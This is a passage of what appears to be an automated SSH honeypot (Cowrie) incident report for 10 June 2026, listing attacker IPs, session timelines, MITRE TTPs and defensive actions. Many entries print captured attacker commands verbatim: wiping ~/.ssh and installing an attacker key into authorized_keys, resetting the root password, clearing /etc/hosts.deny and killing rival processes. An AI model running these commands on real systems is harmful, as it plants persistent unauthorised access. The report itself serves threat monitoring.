| `2026-06-10 11:21:19` | `cowrie.log.closed` |
| `2026-06-10 11:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445a5bcd62ac

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:21 |
| **Last Seen** | 2026-06-10 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:21:22` | `cowrie.session.connect` |
| `2026-06-10 11:21:22` | `cowrie.client.version` |
| `2026-06-10 11:21:22` | `cowrie.client.kex` |
| `2026-06-10 11:21:22` | `cowrie.login.success` |
| `2026-06-10 11:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae5a1023aebb

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:30 |
| **Last Seen** | 2026-06-10 11:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:30:17` | `cowrie.session.connect` |
| `2026-06-10 11:30:17` | `cowrie.client.version` |
| `2026-06-10 11:30:18` | `cowrie.client.kex` |
| `2026-06-10 11:30:18` | `cowrie.login.success` |
| `2026-06-10 11:30:19` | `cowrie.session.params` |
| `2026-06-10 11:30:19` | `cowrie.command.input` |
| `2026-06-10 11:30:19` | `cowrie.command.failed` |
| `2026-06-10 11:30:19` | `cowrie.log.closed` |
| `2026-06-10 11:30:19` | `cowrie.session.params` |
| `2026-06-10 11:30:19` | `cowrie.command.input` |
| `2026-06-10 11:30:19` | `cowrie.session.file_download` |
| `2026-06-10 11:30:19` | `cowrie.log.closed` |
| `2026-06-10 11:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e196aa9bdab

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:30 |
| **Last Seen** | 2026-06-10 11:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:30:22` | `cowrie.session.connect` |
| `2026-06-10 11:30:22` | `cowrie.client.version` |
| `2026-06-10 11:30:22` | `cowrie.client.kex` |
| `2026-06-10 11:30:23` | `cowrie.login.success` |
| `2026-06-10 11:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f12a261e15

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:34 |
| **Last Seen** | 2026-06-10 11:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:34:55` | `cowrie.session.connect` |
| `2026-06-10 11:34:55` | `cowrie.client.version` |
| `2026-06-10 11:34:56` | `cowrie.client.kex` |
| `2026-06-10 11:34:56` | `cowrie.login.success` |
| `2026-06-10 11:34:57` | `cowrie.session.params` |
| `2026-06-10 11:34:57` | `cowrie.command.input` |
| `2026-06-10 11:34:57` | `cowrie.command.failed` |
| `2026-06-10 11:34:57` | `cowrie.log.closed` |
| `2026-06-10 11:34:57` | `cowrie.session.params` |
| `2026-06-10 11:34:57` | `cowrie.command.input` |
| `2026-06-10 11:34:57` | `cowrie.session.file_download` |
| `2026-06-10 11:34:57` | `cowrie.log.closed` |
| `2026-06-10 11:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-426ccd0a0f14

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:35 |
| **Last Seen** | 2026-06-10 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:35:00` | `cowrie.session.connect` |
| `2026-06-10 11:35:00` | `cowrie.client.version` |
| `2026-06-10 11:35:00` | `cowrie.client.kex` |
| `2026-06-10 11:35:01` | `cowrie.login.success` |
| `2026-06-10 11:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a7dafea8576

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:36 |
| **Last Seen** | 2026-06-10 11:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:36:36` | `cowrie.session.connect` |
| `2026-06-10 11:36:36` | `cowrie.client.version` |
| `2026-06-10 11:36:37` | `cowrie.client.kex` |
| `2026-06-10 11:36:37` | `cowrie.login.success` |
| `2026-06-10 11:36:38` | `cowrie.session.params` |
| `2026-06-10 11:36:38` | `cowrie.command.input` |
| `2026-06-10 11:36:38` | `cowrie.command.failed` |
| `2026-06-10 11:36:38` | `cowrie.log.closed` |
| `2026-06-10 11:36:38` | `cowrie.session.params` |
| `2026-06-10 11:36:38` | `cowrie.command.input` |
| `2026-06-10 11:36:38` | `cowrie.session.file_download` |
| `2026-06-10 11:36:38` | `cowrie.log.closed` |
| `2026-06-10 11:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd9c4f2d8bec

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:36 |
| **Last Seen** | 2026-06-10 11:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:36:41` | `cowrie.session.connect` |
| `2026-06-10 11:36:41` | `cowrie.client.version` |
| `2026-06-10 11:36:41` | `cowrie.client.kex` |
| `2026-06-10 11:36:42` | `cowrie.login.success` |
| `2026-06-10 11:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657c52844b33

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:44 |
| **Last Seen** | 2026-06-10 11:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:44:14` | `cowrie.session.connect` |
| `2026-06-10 11:44:14` | `cowrie.client.version` |
| `2026-06-10 11:44:15` | `cowrie.client.kex` |
| `2026-06-10 11:44:16` | `cowrie.login.success` |
| `2026-06-10 11:44:16` | `cowrie.session.params` |
| `2026-06-10 11:44:16` | `cowrie.command.input` |
| `2026-06-10 11:44:16` | `cowrie.command.failed` |
| `2026-06-10 11:44:17` | `cowrie.log.closed` |
| `2026-06-10 11:44:17` | `cowrie.session.params` |
| `2026-06-10 11:44:17` | `cowrie.command.input` |
| `2026-06-10 11:44:17` | `cowrie.session.file_download` |
| `2026-06-10 11:44:17` | `cowrie.log.closed` |
| `2026-06-10 11:44:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c623bc36c305

| Field | Detail |
|---|---|
| **Source IP** | `95.167.225[.]76` |
| **First Seen** | 2026-06-10 11:44 |
| **Last Seen** | 2026-06-10 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 11:44:19` | `cowrie.session.connect` |
| `2026-06-10 11:44:19` | `cowrie.client.version` |
| `2026-06-10 11:44:20` | `cowrie.client.kex` |
| `2026-06-10 11:44:20` | `cowrie.login.success` |
| `2026-06-10 11:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.167.225[.]76` to AbuseIPDB if not already reported
- [ ] Block `95.167.225[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86654c52e121

| Field | Detail |
|---|---|
| **Source IP** | `78.68.65[.]91` |
| **First Seen** | 2026-06-10 12:31 |
| **Last Seen** | 2026-06-10 12:31 |
| **Session Duration** | 53s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 12:31:03` | `cowrie.session.connect` |
| `2026-06-10 12:31:03` | `cowrie.client.version` |
| `2026-06-10 12:31:03` | `cowrie.client.kex` |
| `2026-06-10 12:31:04` | `cowrie.login.failed` |
| `2026-06-10 12:31:05` | `cowrie.login.success` |
| `2026-06-10 12:31:05` | `cowrie.session.params` |
| `2026-06-10 12:31:05` | `cowrie.command.input` |
| `2026-06-10 12:31:05` | `cowrie.command.failed` |
| `2026-06-10 12:31:05` | `cowrie.log.closed` |
| `2026-06-10 12:31:06` | `cowrie.session.params` |
| `2026-06-10 12:31:06` | `cowrie.command.input` |
| `2026-06-10 12:31:06` | `cowrie.log.closed` |
| `2026-06-10 12:31:06` | `cowrie.session.params` |
| `2026-06-10 12:31:06` | `cowrie.command.input` |
| `2026-06-10 12:31:06` | `cowrie.log.closed` |
| `2026-06-10 12:31:07` | `cowrie.session.params` |
| `2026-06-10 12:31:07` | `cowrie.command.input` |
| `2026-06-10 12:31:07` | `cowrie.log.closed` |
| `2026-06-10 12:31:07` | `cowrie.session.params` |
| `2026-06-10 12:31:07` | `cowrie.command.input` |
| `2026-06-10 12:31:07` | `cowrie.log.closed` |
| `2026-06-10 12:31:08` | `cowrie.session.params` |
| `2026-06-10 12:31:08` | `cowrie.command.input` |
| `2026-06-10 12:31:08` | `cowrie.log.closed` |
| `2026-06-10 12:31:08` | `cowrie.session.params` |
| `2026-06-10 12:31:08` | `cowrie.command.input` |
| `2026-06-10 12:31:08` | `cowrie.log.closed` |
| `2026-06-10 12:31:09` | `cowrie.session.params` |
| `2026-06-10 12:31:09` | `cowrie.command.input` |
| `2026-06-10 12:31:09` | `cowrie.log.closed` |
| `2026-06-10 12:31:09` | `cowrie.session.params` |
| `2026-06-10 12:31:09` | `cowrie.command.input` |
| `2026-06-10 12:31:09` | `cowrie.log.closed` |
| `2026-06-10 12:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.68.65[.]91` to AbuseIPDB if not already reported
- [ ] Block `78.68.65[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abb40dfe9799

| Field | Detail |
|---|---|
| **Source IP** | `118.196.43[.]125` |
| **First Seen** | 2026-06-10 13:11 |
| **Last Seen** | 2026-06-10 13:12 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:QtLw9d30Cq13"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:11:41` | `cowrie.session.connect` |
| `2026-06-10 13:11:41` | `cowrie.client.version` |
| `2026-06-10 13:11:41` | `cowrie.client.kex` |
| `2026-06-10 13:11:42` | `cowrie.login.success` |
| `2026-06-10 13:11:43` | `cowrie.session.params` |
| `2026-06-10 13:11:43` | `cowrie.command.input` |
| `2026-06-10 13:11:43` | `cowrie.command.failed` |
| `2026-06-10 13:11:43` | `cowrie.log.closed` |
| `2026-06-10 13:11:43` | `cowrie.session.params` |
| `2026-06-10 13:11:43` | `cowrie.command.input` |
| `2026-06-10 13:11:44` | `cowrie.session.file_download` |
| `2026-06-10 13:11:44` | `cowrie.log.closed` |
| `2026-06-10 13:12:01` | `cowrie.session.params` |
| `2026-06-10 13:12:01` | `cowrie.command.input` |
| `2026-06-10 13:12:01` | `cowrie.log.closed` |
| `2026-06-10 13:12:01` | `cowrie.session.params` |
| `2026-06-10 13:12:01` | `cowrie.command.input` |
| `2026-06-10 13:12:01` | `cowrie.log.closed` |
| `2026-06-10 13:12:02` | `cowrie.session.params` |
| `2026-06-10 13:12:02` | `cowrie.command.input` |
| `2026-06-10 13:12:02` | `cowrie.session.file_download` |
| `2026-06-10 13:12:02` | `cowrie.log.closed` |
| `2026-06-10 13:12:02` | `cowrie.session.params` |
| `2026-06-10 13:12:02` | `cowrie.command.input` |
| `2026-06-10 13:12:02` | `cowrie.log.closed` |
| `2026-06-10 13:12:03` | `cowrie.session.params` |
| `2026-06-10 13:12:03` | `cowrie.command.input` |
| `2026-06-10 13:12:03` | `cowrie.log.closed` |
| `2026-06-10 13:12:03` | `cowrie.session.params` |
| `2026-06-10 13:12:03` | `cowrie.command.input` |
| `2026-06-10 13:12:03` | `cowrie.command.input` |
| `2026-06-10 13:12:03` | `cowrie.log.closed` |
| `2026-06-10 13:12:04` | `cowrie.session.params` |
| `2026-06-10 13:12:04` | `cowrie.command.input` |
| `2026-06-10 13:12:04` | `cowrie.log.closed` |
| `2026-06-10 13:12:04` | `cowrie.session.params` |
| `2026-06-10 13:12:04` | `cowrie.command.input` |
| `2026-06-10 13:12:04` | `cowrie.log.closed` |
| `2026-06-10 13:12:05` | `cowrie.session.params` |
| `2026-06-10 13:12:05` | `cowrie.command.input` |
| `2026-06-10 13:12:05` | `cowrie.log.closed` |
| `2026-06-10 13:12:06` | `cowrie.session.params` |
| `2026-06-10 13:12:06` | `cowrie.command.input` |
| `2026-06-10 13:12:06` | `cowrie.log.closed` |
| `2026-06-10 13:12:06` | `cowrie.session.params` |
| `2026-06-10 13:12:06` | `cowrie.command.input` |
| `2026-06-10 13:12:06` | `cowrie.log.closed` |
| `2026-06-10 13:12:07` | `cowrie.session.params` |
| `2026-06-10 13:12:07` | `cowrie.command.input` |
| `2026-06-10 13:12:07` | `cowrie.log.closed` |
| `2026-06-10 13:12:07` | `cowrie.session.params` |
| `2026-06-10 13:12:07` | `cowrie.command.input` |
| `2026-06-10 13:12:08` | `cowrie.log.closed` |
| `2026-06-10 13:12:08` | `cowrie.session.params` |
| `2026-06-10 13:12:08` | `cowrie.command.input` |
| `2026-06-10 13:12:08` | `cowrie.log.closed` |
| `2026-06-10 13:12:08` | `cowrie.session.params` |
| `2026-06-10 13:12:08` | `cowrie.command.input` |
| `2026-06-10 13:12:08` | `cowrie.log.closed` |
| `2026-06-10 13:12:09` | `cowrie.session.params` |
| `2026-06-10 13:12:09` | `cowrie.command.input` |
| `2026-06-10 13:12:09` | `cowrie.log.closed` |
| `2026-06-10 13:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.43[.]125` to AbuseIPDB if not already reported
- [ ] Block `118.196.43[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ab88dbf0c5a

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-06-10 13:26 |
| **Last Seen** | 2026-06-10 13:27 |
| **Session Duration** | 51s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:26:40` | `cowrie.session.connect` |
| `2026-06-10 13:26:41` | `cowrie.client.version` |
| `2026-06-10 13:26:41` | `cowrie.client.kex` |
| `2026-06-10 13:26:44` | `cowrie.login.success` |
| `2026-06-10 13:26:56` | `cowrie.session.params` |
| `2026-06-10 13:26:56` | `cowrie.command.input` |
| `2026-06-10 13:26:56` | `cowrie.command.failed` |
| `2026-06-10 13:26:58` | `cowrie.log.closed` |
| `2026-06-10 13:27:00` | `cowrie.session.params` |
| `2026-06-10 13:27:00` | `cowrie.command.input` |
| `2026-06-10 13:27:03` | `cowrie.session.file_download` |
| `2026-06-10 13:27:03` | `cowrie.log.closed` |
| `2026-06-10 13:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89962704d644

| Field | Detail |
|---|---|
| **Source IP** | `170.238.160[.]191` |
| **First Seen** | 2026-06-10 13:27 |
| **Last Seen** | 2026-06-10 13:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:27:16` | `cowrie.session.connect` |
| `2026-06-10 13:27:16` | `cowrie.client.version` |
| `2026-06-10 13:27:17` | `cowrie.client.kex` |
| `2026-06-10 13:27:29` | `cowrie.login.success` |
| `2026-06-10 13:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.238.160[.]191` to AbuseIPDB if not already reported
- [ ] Block `170.238.160[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b400c4695789

| Field | Detail |
|---|---|
| **Source IP** | `120.48.154[.]88` |
| **First Seen** | 2026-06-10 13:28 |
| **Last Seen** | 2026-06-10 13:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 13:28:22` | `cowrie.session.connect` |
| `2026-06-10 13:28:22` | `cowrie.client.version` |
| `2026-06-10 13:28:22` | `cowrie.client.kex` |
| `2026-06-10 13:28:24` | `cowrie.login.success` |
| `2026-06-10 13:28:25` | `cowrie.session.params` |
| `2026-06-10 13:28:25` | `cowrie.command.input` |
| `2026-06-10 13:28:25` | `cowrie.command.failed` |
| `2026-06-10 13:28:25` | `cowrie.log.closed` |
| `2026-06-10 13:28:26` | `cowrie.session.params` |
| `2026-06-10 13:28:26` | `cowrie.command.input` |
| `2026-06-10 13:28:27` | `cowrie.session.file_download` |
